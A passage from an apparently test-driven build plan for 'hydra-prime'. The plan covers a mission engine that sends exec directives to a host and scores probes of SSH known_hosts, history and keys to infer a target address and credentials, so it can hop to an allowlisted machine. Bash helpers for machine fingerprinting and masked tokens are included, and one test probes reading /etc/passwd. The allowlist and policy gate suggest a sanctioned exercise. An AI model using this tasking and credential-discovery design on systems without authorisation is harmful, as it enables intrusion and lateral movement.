    q = enqueue(q, { id: 'p2', probeId: 'b', value: 0.9, eta_s: 5, tokenCost: 0, targetHypotheses: [], fallbackIds: [] });
    q = enqueue(q, { id: 'p3', probeId: 'c', value: 0.5, eta_s: 5, tokenCost: 0, targetHypotheses: [], fallbackIds: [] });
    const [first, q1] = popHighest(q);
    expect(first?.id).toBe('p2');
    const [second] = popHighest(q1);
    expect(second?.id).toBe('p3');
  });

  it('size tracks correctly', () => {
    let q = newQueue();
    expect(size(q)).toBe(0);
    q = enqueue(q, { id: 'x', probeId: 'a', value: 0.5, eta_s: 1, tokenCost: 0, targetHypotheses: [], fallbackIds: [] });
    expect(size(q)).toBe(1);
  });

  it('rescore replaces value via fn', () => {
    let q = newQueue();
    q = enqueue(q, { id: 'p1', probeId: 'a', value: 0.3, eta_s: 5, tokenCost: 0, targetHypotheses: [], fallbackIds: [] });
    q = rescore(q, e => ({ ...e, value: 0.8 }));
    const [top] = popHighest(q);
    expect(top?.value).toBe(0.8);
  });
});
```

- [ ] **Step 2: Run test to verify it fails**

```bash
npx vitest run tests/engine/queue.test.ts
```

Expected: FAIL.

- [ ] **Step 3: Write minimal implementation**

`src/engine/queue.ts`:

```typescript
export interface QueueEntry {
  id: string;
  probeId: string;
  value: number;
  eta_s: number;
  tokenCost: number;
  targetHypotheses: string[];
  fallbackIds: string[];
}

export interface PriorityQueue {
  entries: QueueEntry[];
}

export function newQueue(): PriorityQueue { return { entries: [] }; }
export function size(q: PriorityQueue): number { return q.entries.length; }
export function enqueue(q: PriorityQueue, e: QueueEntry): PriorityQueue {
  return { entries: [...q.entries, e] };
}
export function popHighest(q: PriorityQueue): [QueueEntry | undefined, PriorityQueue] {
  if (q.entries.length === 0) return [undefined, q];
  const sorted = [...q.entries].sort((a, b) => b.value - a.value);
  const [top, ...rest] = sorted;
  return [top, { entries: rest }];
}
export function rescore(q: PriorityQueue, fn: (e: QueueEntry) => QueueEntry): PriorityQueue {
  return { entries: q.entries.map(fn) };
}
```

- [ ] **Step 4: Run test to verify it passes**

```bash
npx vitest run tests/engine/queue.test.ts
```

Expected: PASS, 3 tests.

- [ ] **Step 5: Commit**

```bash
git add src/engine/queue.ts tests/engine/queue.test.ts
git commit -m "feat: priority queue (immutable, value-sorted on pop)"
```

---

### Task 25: Action selection metric (value function)

**Files:**
- Create: `src/engine/value.ts`
- Create: `tests/engine/value.test.ts`

- [ ] **Step 1: Write the failing test**

`tests/engine/value.test.ts`:

```typescript
import { describe, it, expect } from 'vitest';
import { computeValue, urgency } from '../../src/engine/value';

describe('value function', () => {
  it('urgency rises as time_remaining shrinks', () => {
    expect(urgency(86_400)).toBeLessThan(urgency(3_600));
    expect(urgency(60)).toBeGreaterThan(urgency(3_600));
  });

  it('computeValue scales with EIG and inversely with cost', () => {
    const v1 = computeValue({ eig: 0.8, eta_s: 1, tokenCost: 0, timeRemainingS: 80_000, lambda: 0 });
    const v2 = computeValue({ eig: 0.2, eta_s: 1, tokenCost: 0, timeRemainingS: 80_000, lambda: 0 });
    expect(v1).toBeGreaterThan(v2);
  });

  it('lambda penalizes token cost (gold mode)', () => {
    const cheap = computeValue({ eig: 0.5, eta_s: 1, tokenCost: 0, timeRemainingS: 80_000, lambda: 10 });
    const expensive = computeValue({ eig: 0.5, eta_s: 1, tokenCost: 1000, timeRemainingS: 80_000, lambda: 10 });
    expect(cheap).toBeGreaterThan(expensive);
  });

  it('does not divide by zero', () => {
    const v = computeValue({ eig: 1, eta_s: 0, tokenCost: 0, timeRemainingS: 80_000, lambda: 0 });
    expect(Number.isFinite(v)).toBe(true);
  });
});
```

- [ ] **Step 2: Run test to verify it fails**

```bash
npx vitest run tests/engine/value.test.ts
```

Expected: FAIL.

- [ ] **Step 3: Write minimal implementation**

`src/engine/value.ts`:

```typescript
export interface ValueInputs {
  eig: number;
  eta_s: number;
  tokenCost: number;
  timeRemainingS: number;
  lambda: number;
}

export function urgency(timeRemainingS: number): number {
  // 1.0 at 24h, ramps to ~3.0 as we approach 0.
  const total = 86_400;
  const frac = Math.max(0.001, timeRemainingS / total);
  return 1 + 2 * (1 - frac);
}

export function computeValue(i: ValueInputs): number {
  const denom = Math.max(0.1, i.eta_s + i.lambda * i.tokenCost);
  return (i.eig * urgency(i.timeRemainingS)) / denom;
}
```

- [ ] **Step 4: Run test to verify it passes**

```bash
npx vitest run tests/engine/value.test.ts
```

Expected: PASS, 4 tests.

- [ ] **Step 5: Commit**

```bash
git add src/engine/value.ts tests/engine/value.test.ts
git commit -m "feat: action selection value function (EIG × urgency / cost)"
```

---

### Task 26: Mission brief generator

**Files:**
- Create: `src/engine/brief.ts`
- Create: `tests/engine/brief.test.ts`

- [ ] **Step 1: Write the failing test**

`tests/engine/brief.test.ts`:

```typescript
import { describe, it, expect } from 'vitest';
import { generateBrief } from '../../src/engine/brief';
import { newHypothesis, addCandidate, applyObservation } from '../../src/engine/beliefs';
import type { MissionState } from '../../src/types';

const m: MissionState = {
  mission_id: 'm1', origin_fingerprint: 'fp', platform: 'linux',
  phase: 'planning', honor_tier: 'gold',
  budget_paid_usd_remaining: 10, strict_gold: false,
  wall_clock_started_ms: Date.now() - 3600_000,
  wall_clock_deadline_ms: Date.now() + 82_800_000,
  tick: 42, beliefs: {}, jump_chain: ['origin'],
  target_allowlist: ['origin', 'kvm2'],
};

describe('mission brief', () => {
  it('serializes mission goal + budget + time', () => {
    const b = generateBrief(m, { lastProgressTick: 40, lastProgressWallS: 5 });
    expect(b.goal).toMatch(/kvm2|target/);
    expect(b.budget_remaining.paid_usd).toBe(10);
    expect(b.time_remaining_s).toBeGreaterThan(0);
    expect(b.last_progress_wall_s).toBe(5);
  });

  it('reports current_best_path when address+cred hypotheses exist', () => {
    let addr = newHypothesis('h:target-address', 'target-address');
    addr = addCandidate(addr, '10.0.0.1', 5);
    addr = applyObservation(addr, { source_class: 's', note: 'n', newCandidates: [], llrByCandidate: {} }, 1);
    let cred = newHypothesis('h:target-credentials', 'target-credentials');
    cred = addCandidate(cred, '~/.ssh/k', 3);
    cred = applyObservation(cred, { source_class: 's', note: 'n', newCandidates: [], llrByCandidate: {} }, 1);
    const b = generateBrief({ ...m, beliefs: { 'h:target-address': addr, 'h:target-credentials': cred } },
      { lastProgressTick: 40, lastProgressWallS: 5 });
    expect(b.current_best_path?.address_hypothesis.candidate).toBe('10.0.0.1');
    expect(b.current_best_path?.confidence_to_attempt_hop).toBeGreaterThan(0);
  });

  it('lists gaps when hypotheses unconverged', () => {
    let addr = newHypothesis('h:target-address', 'target-address');
    addr = addCandidate(addr, 'a', 0);
    addr = addCandidate(addr, 'b', 0);
    addr = applyObservation(addr, { source_class: 's', note: 'n', newCandidates: [], llrByCandidate: {} }, 1);
    const b = generateBrief({ ...m, beliefs: { 'h:target-address': addr } },
      { lastProgressTick: 40, lastProgressWallS: 5 });
    expect(b.gap_to_success.length).toBeGreaterThan(0);
  });
});
```

- [ ] **Step 2: Run test to verify it fails**

```bash
npx vitest run tests/engine/brief.test.ts
```

Expected: FAIL.

- [ ] **Step 3: Write minimal implementation**

`src/engine/brief.ts`:

```typescript
import type { MissionState } from '../types';
import { topCandidate, isConverged } from './beliefs';
import { confidenceToAttemptHop } from './confidence';

export interface MissionBrief {
  goal: string;
  time_remaining_s: number;
  budget_remaining: { paid_usd: number; tier_status: 'gold' | 'silver' | 'failed' };
  current_best_path: {
    address_hypothesis: { candidate: string; posterior: number };
    credential_hypothesis: { candidate: string; posterior: number };
    auth_method: string;
    confidence_to_attempt_hop: number;
  } | null;
  gap_to_success: string[];
  last_progress_wall_s: number;
}

export interface BriefContext {
  lastProgressTick: number;
  lastProgressWallS: number;
}

export function generateBrief(m: MissionState, ctx: BriefContext): MissionBrief {
  const remainingS = Math.max(0, Math.floor((m.wall_clock_deadline_ms - Date.now()) / 1000));
  const addr = m.beliefs['h:target-address'];
  const cred = m.beliefs['h:target-credentials'];
  let path: MissionBrief['current_best_path'] = null;
  if (addr && cred) {
    const tA = topCandidate(addr); const tC = topCandidate(cred);
    if (tA && tC) {
      path = {
        address_hypothesis: { candidate: tA.value, posterior: tA.posterior },
        credential_hypothesis: { candidate: tC.value, posterior: tC.posterior },
        auth_method: 'ssh-keyfile',
        confidence_to_attempt_hop: confidenceToAttemptHop(m.beliefs),
      };
    }
  }
  const gaps: string[] = [];
  for (const h of Object.values(m.beliefs)) {
    if (h.critical && !isConverged(h)) {
      const top = topCandidate(h);
      gaps.push(`resolve ${h.id} (top posterior=${top?.posterior.toFixed(2) ?? 'n/a'})`);
    }
  }
  return {
    goal: `reach ${m.target_allowlist.filter(t => t !== 'origin').join(' or ')} and signal_success from it`,
    time_remaining_s: remainingS,
    budget_remaining: { paid_usd: m.budget_paid_usd_remaining, tier_status: m.honor_tier },
    current_best_path: path,
    gap_to_success: gaps,
    last_progress_wall_s: ctx.lastProgressWallS,
  };
}
```

- [ ] **Step 4: Run test to verify it passes**

```bash
npx vitest run tests/engine/brief.test.ts
```

Expected: PASS, 3 tests.

- [ ] **Step 5: Commit**

```bash
git add src/engine/brief.ts tests/engine/brief.test.ts
git commit -m "feat: mission brief generator (per-tick artifact)"
```

---

### Task 27: Tick cycle (pickAction + ingestResult) wired into MissionDO

**Files:**
- Create: `src/engine/tick.ts`
- Modify: `src/mission-do.ts` (replace `nextDirective` and `ingest` stubs)
- Create: `tests/engine/tick.test.ts`

- [ ] **Step 1: Write the failing test**

`tests/engine/tick.test.ts`:

```typescript
import { describe, it, expect } from 'vitest';
import { env } from 'cloudflare:test';
import { seedCatalog } from '../../src/catalog/seed';

async function callDo(missionId: string, path: string, init?: RequestInit) {
  const id = env.MISSION_DO.idFromName(missionId);
  const stub = env.MISSION_DO.get(id);
  return stub.fetch(`https://do/${path}`, init);
}

describe('tick cycle integration', () => {
  it('first directive after init is exec for a Tier 1 probe', async () => {
    await seedCatalog(env.HYDRA_KV);
    await callDo('m_tick_1', 'init', { method: 'POST', body: JSON.stringify({
      fingerprint: 'fp', platform: 'linux',
      target_allowlist: ['origin', 'kvm2'], strict_gold: true,
      budget_paid_usd: 10, deadline_ms: Date.now() + 86_400_000,
    })});
    await callDo('m_tick_1', 'transition', { method: 'POST', body: JSON.stringify({ to: 'provisioning' }) });
    await callDo('m_tick_1', 'transition', { method: 'POST', body: JSON.stringify({ to: 'scanning' }) });
    const res = await callDo('m_tick_1', 'next-directive', { method: 'POST' });
    const d = await res.json() as { op: string; cmd?: string };
    expect(d.op).toBe('exec');
    expect(d.cmd).toMatch(/ssh|known_hosts|hosts|history|key/);
  });

  it('ingest applies LLR and updates beliefs', async () => {
    await seedCatalog(env.HYDRA_KV);
    await callDo('m_tick_2', 'init', { method: 'POST', body: JSON.stringify({
      fingerprint: 'fp', platform: 'linux',
      target_allowlist: ['origin', 'kvm2'], strict_gold: true,
      budget_paid_usd: 10, deadline_ms: Date.now() + 86_400_000,
    })});
    await callDo('m_tick_2', 'transition', { method: 'POST', body: JSON.stringify({ to: 'provisioning' }) });
    await callDo('m_tick_2', 'transition', { method: 'POST', body: JSON.stringify({ to: 'scanning' }) });
    const dRes = await callDo('m_tick_2', 'next-directive', { method: 'POST' });
    const d = await dRes.json() as { id: string; op: string };
    await callDo('m_tick_2', 'ingest', { method: 'POST', body: JSON.stringify({
      op_id: d.id, ok: true,
      data: {
        probeId: 'known-hosts-enum',
        observations: [
          { pattern: 'target_name_present', extracted: { value: 'kvm2' }, hypothesis: 'h:target-address' },
        ],
      },
      wall_ms: 4,
    })});
    const stateRes = await callDo('m_tick_2', 'state');
    const state = await stateRes.json() as { beliefs: Record<string, { candidates: { value: string; posterior: number }[] }> };
    const top = state.beliefs['h:target-address']?.candidates.find(c => c.value === 'kvm2');
    expect(top).toBeDefined();
    expect(top!.posterior).toBeGreaterThan(0.05);
  });
});
```

- [ ] **Step 2: Run test to verify it fails**

```bash
npx vitest run tests/engine/tick.test.ts
```

Expected: FAIL — `next-directive` returns yield stub; ingest is no-op.

- [ ] **Step 3: Write minimal implementation**

`src/engine/tick.ts`:

```typescript
import type { MissionState, Directive } from '../types';
import type { Env } from '../index';
import { applyObservation, newHypothesis, recomputeStatus, type Hypothesis } from './beliefs';
import { newQueue, enqueue, popHighest, type PriorityQueue } from './queue';
import { computeValue } from './value';
import { ALL_PROBES } from '../catalog/registry';
import type { ProbeManifest } from '../catalog/manifest';
import { evaluate, type ProposedAction } from '../codex';

export function buildInitialQueue(m: MissionState): PriorityQueue {
  let q = newQueue();
  for (const p of ALL_PROBES) {
    if (!p.platforms.includes(m.platform)) continue;
    const remainingS = Math.max(1, Math.floor((m.wall_clock_deadline_ms - Date.now()) / 1000));
    const value = computeValue({
      eig: p.eigPrior, eta_s: p.wallClockEstimateS, tokenCost: p.tokenCostEstimate,
      timeRemainingS: remainingS, lambda: m.strict_gold ? 0.001 : 0.0001,
    });
    q = enqueue(q, {
      id: `q_${p.id}_${m.tick}`,
      probeId: p.id, value, eta_s: p.wallClockEstimateS,
      tokenCost: p.tokenCostEstimate,
      targetHypotheses: p.llrContributions.map(c => c.targetHypothesis),
      fallbackIds: p.fallbackProbeIds,
    });
  }
  return q;
}

export function pickAction(m: MissionState, q: PriorityQueue): { directive: Directive; queue: PriorityQueue; probeId: string | null } {
  const [top, rest] = popHighest(q);
  if (!top) {
    return { directive: { id: `op_${crypto.randomUUID().slice(0, 8)}`, op: 'yield', sleep_s: 5 }, queue: q, probeId: null };
  }
  const probe = ALL_PROBES.find(p => p.id === top.probeId)!;
  const body = probe.bodyByPlatform[m.platform] ?? '';
  const action: ProposedAction = { type: 'exec', cmd: body };
  const decision = evaluate(action, m);
  if (!decision.allowed) {
    return pickAction(m, rest);
  }
  return {
    directive: {
      id: `op_${crypto.randomUUID().slice(0, 8)}`,
      op: 'exec', cmd: body, timeout_s: probe.wallClockEstimateS * 5,
    },
    queue: rest,
    probeId: top.probeId,
  };
}

export interface IngestPayload {
  probeId: string;
  observations: { pattern: string; extracted: { value: string }; hypothesis: string }[];
}

export function ingestObservations(beliefs: Record<string, Hypothesis>, payload: IngestPayload, tick: number): Record<string, Hypothesis> {
  const probe = ALL_PROBES.find(p => p.id === payload.probeId);
  if (!probe) return beliefs;
  const out = { ...beliefs };
  for (const obs of payload.observations) {
    const llrEntry = probe.llrContributions.find(c => c.pattern === obs.pattern && c.targetHypothesis === obs.hypothesis);
    const llr = llrEntry?.llr ?? 0;
    if (llr === 0) continue;
    const h = out[obs.hypothesis] ?? newHypothesis(obs.hypothesis, 'target-address');
    out[obs.hypothesis] = recomputeStatus(applyObservation(h, {
      source_class: probe.id, note: obs.pattern,
      newCandidates: [obs.extracted.value],
      llrByCandidate: { [obs.extracted.value]: llr },
    }, tick));
  }
  return out;
}
```

`src/mission-do.ts` — replace `nextDirective` and `ingest`:

```typescript
private async nextDirective(): Promise<Response> {
  if (!this.mission) return new Response('not initialized', { status: 404 });
  const { buildInitialQueue, pickAction } = await import('./engine/tick');
  const q = buildInitialQueue(this.mission);
  const { directive, probeId } = pickAction(this.mission, q);
  if (probeId) {
    await this.state.storage.put(`pending:${directive.id}`, { probeId });
  }
  this.mission.tick += 1;
  await this.state.storage.put('mission', this.mission);
  return Response.json(directive);
}

private async ingest(req: Request): Promise<Response> {
  if (!this.mission) return new Response('not initialized', { status: 404 });
  const env = await req.json() as { op_id: string; ok: boolean; data?: { probeId?: string; observations?: unknown[] } };
  await this.state.storage.put(`tick:${this.mission.tick}`, env);
  if (env.ok && env.data?.probeId && Array.isArray(env.data.observations)) {
    const { ingestObservations } = await import('./engine/tick');
    this.mission.beliefs = ingestObservations(this.mission.beliefs, {
      probeId: env.data.probeId,
      observations: env.data.observations as { pattern: string; extracted: { value: string }; hypothesis: string }[],
    }, this.mission.tick);
  }
  await this.state.storage.put('mission', this.mission);
  return new Response('ok');
}
```

- [ ] **Step 4: Run test to verify it passes**

```bash
npx vitest run tests/engine/tick.test.ts
```

Expected: PASS, 2 tests.

- [ ] **Step 5: Commit**

```bash
git add src/engine/tick.ts src/mission-do.ts tests/engine/tick.test.ts
git commit -m "feat: tick engine — pickAction + ingestObservations wired into DO"
```

---

### Task 28: Phase transitions + stall + contingency activation

**Files:**
- Create: `src/engine/phases.ts`
- Create: `src/engine/contingency.ts`
- Modify: `src/mission-do.ts` (call advancePhase from ingest)
- Create: `tests/engine/phases.test.ts`

- [ ] **Step 1: Write the failing test**

`tests/engine/phases.test.ts`:

```typescript
import { describe, it, expect } from 'vitest';
import { advancePhase, isStalled } from '../../src/engine/phases';
import { activateContingency } from '../../src/engine/contingency';
import { newHypothesis, addCandidate, applyObservation } from '../../src/engine/beliefs';
import type { MissionState } from '../../src/types';

const baseM: MissionState = {
  mission_id: 'm', origin_fingerprint: 'fp', platform: 'linux',
  phase: 'scanning', honor_tier: 'gold',
  budget_paid_usd_remaining: 10, strict_gold: true,
  wall_clock_started_ms: Date.now(), wall_clock_deadline_ms: Date.now() + 86_400_000,
  tick: 5, beliefs: {}, jump_chain: ['origin'],
  target_allowlist: ['origin', 'kvm2'],
};

describe('phase transitions', () => {
  it('scanning → hypothesizing when first hypothesis appears', () => {
    let h = newHypothesis('h:target-address', 'target-address');
    h = addCandidate(h, 'kvm2', 2);
    h = applyObservation(h, { source_class: 's', note: 'n', newCandidates: [], llrByCandidate: {} }, 1);
    const next = advancePhase({ ...baseM, beliefs: { 'h:target-address': h } });
    expect(next).toBe('hypothesizing');
  });

  it('hypothesizing → planning when target-address converged AND target-credentials converged', () => {
    let addr = newHypothesis('h:target-address', 'target-address');
    addr = addCandidate(addr, 'kvm2', 10);
    addr = applyObservation(addr, { source_class: 's', note: 'n', newCandidates: [], llrByCandidate: {} }, 1);
    let cred = newHypothesis('h:target-credentials', 'target-credentials');
    cred = addCandidate(cred, '~/.ssh/k', 10);
    cred = applyObservation(cred, { source_class: 's', note: 'n', newCandidates: [], llrByCandidate: {} }, 1);
    const next = advancePhase({ ...baseM, phase: 'hypothesizing', beliefs: { 'h:target-address': addr, 'h:target-credentials': cred } });
    expect(next).toBe('planning');
  });

  it('isStalled true after 15min wall-clock no-progress in phase', () => {
    expect(isStalled('scanning', Date.now() - 16 * 60_000)).toBe(true);
    expect(isStalled('scanning', Date.now() - 5 * 60_000)).toBe(false);
  });
});

describe('contingency activation', () => {
  it('phase-stall activates fallback when timeout fires', () => {
    const action = activateContingency('phase-stall', { phase: 'scanning' });
    expect(action.kind).toBe('force-transition');
  });

  it('hypothesis-collapse triggers tier escalation', () => {
    const action = activateContingency('hypothesis-collapse', { hypothesisId: 'h:target-address' });
    expect(action.kind).toBe('enqueue-tier2-probes');
  });
});
```

- [ ] **Step 2: Run test to verify it fails**

```bash
npx vitest run tests/engine/phases.test.ts
```

Expected: FAIL.

- [ ] **Step 3: Write minimal implementation**

`src/engine/phases.ts`:

```typescript
import type { MissionState, Phase } from '../types';
import { isConverged } from './beliefs';

const STALL_THRESHOLD_MS_BY_PHASE: Record<Phase, number> = {
  registered: 60_000, provisioning: 60_000,
  scanning: 15 * 60_000, hypothesizing: 15 * 60_000,
  planning: 10 * 60_000, 'executing-hop': 5 * 60_000, verifying: 5 * 60_000,
  completed: Number.POSITIVE_INFINITY, failed: Number.POSITIVE_INFINITY, terminated: Number.POSITIVE_INFINITY,
};

export function advancePhase(m: MissionState): Phase {
  const addr = m.beliefs['h:target-address'];
  const cred = m.beliefs['h:target-credentials'];

  if (m.phase === 'scanning' && Object.keys(m.beliefs).length > 0) return 'hypothesizing';
  if (m.phase === 'hypothesizing' && addr && cred && isConverged(addr) && isConverged(cred)) return 'planning';
  return m.phase;
}

export function isStalled(phase: Phase, lastProgressMs: number, now: number = Date.now()): boolean {
  return (now - lastProgressMs) > STALL_THRESHOLD_MS_BY_PHASE[phase];
}
```

`src/engine/contingency.ts`:

```typescript
export type ContingencyKind = 'phase-stall' | 'hypothesis-collapse' | 'tier-exhausted' | 'budget-low' | 'brain-fallback' | 'probe-failure';

export type ContingencyAction =
  | { kind: 'force-transition'; toPhase?: string }
  | { kind: 'enqueue-tier2-probes'; targetHypothesis?: string }
  | { kind: 'compressed-strategy' }
  | { kind: 'fail-mission'; reason: string }
  | { kind: 'enqueue-fallback-probe'; probeId: string };

export function activateContingency(
  kind: ContingencyKind, ctx: Record<string, string>,
): ContingencyAction {
  switch (kind) {
    case 'phase-stall': return { kind: 'force-transition' };
    case 'hypothesis-collapse': return { kind: 'enqueue-tier2-probes', targetHypothesis: ctx.hypothesisId };
    case 'tier-exhausted': return { kind: 'fail-mission', reason: 'unreachable-exhausted' };
    case 'budget-low': return { kind: 'compressed-strategy' };
    case 'brain-fallback': return { kind: 'compressed-strategy' };
    case 'probe-failure': return { kind: 'enqueue-fallback-probe', probeId: ctx.fallbackProbeId ?? '' };
  }
}
```

`src/mission-do.ts` — extend `ingest()` to advance phase:

```typescript
// at end of ingest(), before put('mission'):
const { advancePhase } = await import('./engine/phases');
const nextPhase = advancePhase(this.mission);
if (nextPhase !== this.mission.phase) {
  this.mission.phase = nextPhase;
}
```

- [ ] **Step 4: Run test to verify it passes**

```bash
npx vitest run tests/engine/phases.test.ts
```

Expected: PASS, 5 tests.

- [ ] **Step 5: Commit**

```bash
git add src/engine/phases.ts src/engine/contingency.ts src/mission-do.ts tests/engine/phases.test.ts
git commit -m "feat: phase transitions + stall detection + contingency catalog"
```

---

## Phase G — hydra.sh script (Tasks 29–34)

### Task 29: bash HMAC + XOR token helpers (lib/hmac.sh)

**Files:**
- Create: `script/lib/hmac.sh`
- Create: `script/test/hmac_bats.bats`

- [ ] **Step 1: Write the failing test**

`script/test/hmac_bats.bats`:

```bash
#!/usr/bin/env bats

load '../lib/hmac.sh'

@test "hydra_hmac_hex matches openssl reference" {
  expected=$(printf 'GET\n/v1/poll\n\n1700000000' | openssl dgst -sha256 -hmac 'k_test' -hex | awk '{print $2}')
  actual=$(hydra_hmac_hex 'k_test' 'GET' '/v1/poll' '' '1700000000')
  [ "$actual" = "$expected" ]
}

@test "hydra_unmask_token recovers original on matching fingerprint" {
  # Make a known token, mask in TS-equivalent locally, then unmask in bash.
  local token_hex='0102030405060708090a0b0c0d0e0f101112131415161718191a1b1c1d1e1f20'
  local fp='sha256:abcdef'
  local salt='salt_xyz'
  local mask_hex
  mask_hex=$(printf '%s' "$fp" | openssl dgst -sha256 -hmac "$salt" -hex | awk '{print $2}')
  # XOR the first 32 bytes of mask with token_hex
  local masked_hex
  masked_hex=$(python3 -c "
import sys
t=bytes.fromhex('$token_hex'); m=bytes.fromhex('$mask_hex')[:len(t)]
sys.stdout.write(bytes(a^b for a,b in zip(t,m)).hex())
")
  recovered=$(hydra_unmask_token "$masked_hex" "$fp" "$salt")
  [ "$recovered" = "$token_hex" ]
}
```

- [ ] **Step 2: Run test to verify it fails**

```bash
cd C:/Users/ajay/Projects/hydra-prime
docker run --rm -v "$(pwd)/script:/s" -w /s alpine:3.20 sh -c \
  "apk add --no-cache bats bash openssl python3 >/dev/null && bats test/hmac_bats.bats"
```

Expected: FAIL — lib/hmac.sh missing.

- [ ] **Step 3: Write minimal implementation**

`script/lib/hmac.sh`:

```bash
# HMAC + XOR token helpers. POSIX-bash. No jq.

hydra_hmac_hex() {
  # $1=key  $2=method  $3=path  $4=body  $5=ts
  local msg
  msg=$(printf '%s\n%s\n%s\n%s' "$2" "$3" "$4" "$5")
  printf '%s' "$msg" | openssl dgst -sha256 -hmac "$1" -hex | awk '{print $2}'
}

hydra_unmask_token() {
  # $1=masked_hex  $2=fingerprint  $3=salt
  local masked_hex="$1" fp="$2" salt="$3" mask_hex
  mask_hex=$(printf '%s' "$fp" | openssl dgst -sha256 -hmac "$salt" -hex | awk '{print $2}')
  # Truncate mask to length of masked_hex.
  local need=${#masked_hex}
  mask_hex=${mask_hex:0:$need}
  # XOR byte-by-byte (each hex byte = 2 chars).
  local out='' i mb tb xor
  for ((i=0; i<need; i+=2)); do
    tb=$((16#${masked_hex:i:2}))
    mb=$((16#${mask_hex:i:2}))
    xor=$((tb ^ mb))
    out+=$(printf '%02x' "$xor")
  done
  printf '%s' "$out"
}
```

- [ ] **Step 4: Run test to verify it passes**

```bash
docker run --rm -v "$(pwd)/script:/s" -w /s alpine:3.20 sh -c \
  "apk add --no-cache bats bash openssl python3 >/dev/null && bats test/hmac_bats.bats"
```

Expected: PASS, 2 tests.

- [ ] **Step 5: Commit**

```bash
git add script/lib/hmac.sh script/test/hmac_bats.bats
git commit -m "feat(script): bash HMAC-SHA256 + XOR token unmask"
```

---

### Task 30: bash boot sequence (lib/boot.sh)

**Files:**
- Create: `script/lib/boot.sh`
- Create: `script/test/boot_bats.bats`

- [ ] **Step 1: Write the failing test**

`script/test/boot_bats.bats`:

```bash
#!/usr/bin/env bats

load '../lib/boot.sh'

@test "hydra_fingerprint emits sha256 hex, 64 chars" {
  fp=$(hydra_fingerprint)
  [ "${#fp}" -eq 64 ]
  echo "$fp" | grep -qE '^[0-9a-f]{64}$'
}

@test "hydra_machine_uuid prefers /etc/machine-id when present" {
  echo "deadbeefcafe1234567890abcdef00112233445566778899aabbccddeeff0011" > /etc/machine-id
  uuid=$(hydra_machine_uuid)
  [ "$uuid" = "deadbeefcafe1234567890abcdef00112233445566778899aabbccddeeff0011" ]
}

@test "hydra_init_home creates HYDRA_HOME with 0700 perms" {
  export HOME=/tmp/test_home_$$
  mkdir -p "$HOME"
  hydra_init_home 'm_test'
  [ -d "$HOME/.hydra/m_test" ]
  perms=$(stat -c '%a' "$HOME/.hydra/m_test")
  [ "$perms" = "700" ]
}
```

- [ ] **Step 2: Run test to verify it fails**

```bash
docker run --rm -v "$(pwd)/script:/s" -w /s alpine:3.20 sh -c \
  "apk add --no-cache bats bash openssl coreutils >/dev/null && bats test/boot_bats.bats"
```

Expected: FAIL.

- [ ] **Step 3: Write minimal implementation**

`script/lib/boot.sh`:

```bash
# Boot sequence: fingerprint, HYDRA_HOME, register handshake.

hydra_machine_uuid() {
  if [ -r /etc/machine-id ]; then
    cat /etc/machine-id
    return
  fi
  if command -v ioreg >/dev/null 2>&1; then
    ioreg -rd1 -c IOPlatformExpertDevice 2>/dev/null \
      | awk -F\" '/IOPlatformUUID/{print $4; exit}' && return
  fi
  if command -v lsblk >/dev/null 2>&1; then
    lsblk -ndo SERIAL 2>/dev/null | awk 'NF{print; exit}' && return
  fi
  echo "no-machine-uuid"
}

hydra_primary_mac() {
  if command -v ip >/dev/null 2>&1; then
    ip -o link show 2>/dev/null | awk '/link\/ether/ && !/00:00:00:00:00:00/ {print $17; exit}'
    return
  fi
  if command -v ifconfig >/dev/null 2>&1; then
    ifconfig 2>/dev/null | awk '/ether/ {print $2; exit}'
    return
  fi
  echo "00:00:00:00:00:00"
}

hydra_fingerprint() {
  local h m u
  h=$(hostname 2>/dev/null || echo unknown)
  m=$(hydra_primary_mac)
  u=$(hydra_machine_uuid)
  printf '%s|%s|%s' "$h" "$m" "$u" | openssl dgst -sha256 -hex | awk '{print $2}'
}

hydra_detect_platform() {
  case "$(uname -s)" in
    Linux*)
      if grep -qi microsoft /proc/version 2>/dev/null; then echo wsl; else echo linux; fi ;;
    Darwin*) echo macos ;;
    *) echo linux ;;
  esac
}

hydra_init_home() {
  # $1 = mission_id
  HYDRA_HOME="$HOME/.hydra/$1"
  mkdir -p "$HYDRA_HOME"
  chmod 700 "$HYDRA_HOME"
  export HYDRA_HOME
}
```

- [ ] **Step 4: Run test to verify it passes**

```bash
docker run --rm -v "$(pwd)/script:/s" -w /s alpine:3.20 sh -c \
  "apk add --no-cache bats bash openssl coreutils iproute2 >/dev/null && bats test/boot_bats.bats"
```

Expected: PASS, 3 tests.

- [ ] **Step 5: Commit**

```bash
git add script/lib/boot.sh script/test/boot_bats.bats
git commit -m "feat(script): fingerprint (host+mac+machine_uuid) + HYDRA_HOME init"
```

---

### Task 31: bash primitives (lib/primitives.sh)

**Files:**
- Create: `script/lib/primitives.sh`
- Create: `script/test/primitives_bats.bats`

- [ ] **Step 1: Write the failing test**

`script/test/primitives_bats.bats`:

```bash
#!/usr/bin/env bats

load '../lib/primitives.sh'

@test "hydra_exec_cmd captures stdout, exit, wall_ms" {
  result=$(hydra_exec_cmd 'echo hi' 5)
  echo "$result" | grep -q '"stdout":"hi'
  echo "$result" | grep -q '"exit_code":0'
  echo "$result" | grep -qE '"wall_ms":[0-9]+'
}

@test "hydra_exec_cmd reports nonzero exit" {
  result=$(hydra_exec_cmd 'exit 7' 5)
  echo "$result" | grep -q '"exit_code":7'
}

@test "hydra_read_file refuses path outside HYDRA_HOME when scoped" {
  export HYDRA_HOME=/tmp/testhome_$$
  mkdir -p "$HYDRA_HOME"
  echo hi > "$HYDRA_HOME/x"
  out=$(hydra_read_file "$HYDRA_HOME/x" 100 'home')
  echo "$out" | grep -q '"size":'
  err=$(hydra_read_file '/etc/passwd' 100 'home' || true)
  echo "$err" | grep -q '"err":"policy"'
}

@test "hydra_read_file truncates at max_bytes" {
  export HYDRA_HOME=/tmp/testhome2_$$
  mkdir -p "$HYDRA_HOME"
  head -c 1000 /dev/urandom > "$HYDRA_HOME/big"
  out=$(hydra_read_file "$HYDRA_HOME/big" 100 'home')
  echo "$out" | grep -q '"truncated":true'
}
```

- [ ] **Step 2: Run test to verify it fails**

```bash
docker run --rm -v "$(pwd)/script:/s" -w /s alpine:3.20 sh -c \
  "apk add --no-cache bats bash coreutils >/dev/null && bats test/primitives_bats.bats"
```

Expected: FAIL.

- [ ] **Step 3: Write minimal implementation**

`script/lib/primitives.sh`:

```bash
# Six primitives: register, poll, exec, read, report, terminate.

# JSON escape helper (minimal — handles backslash, quote, newline, tab, control).
hydra_json_escape() {
  python3 -c "import json,sys; sys.stdout.write(json.dumps(sys.stdin.read()))"
}

hydra_exec_cmd() {
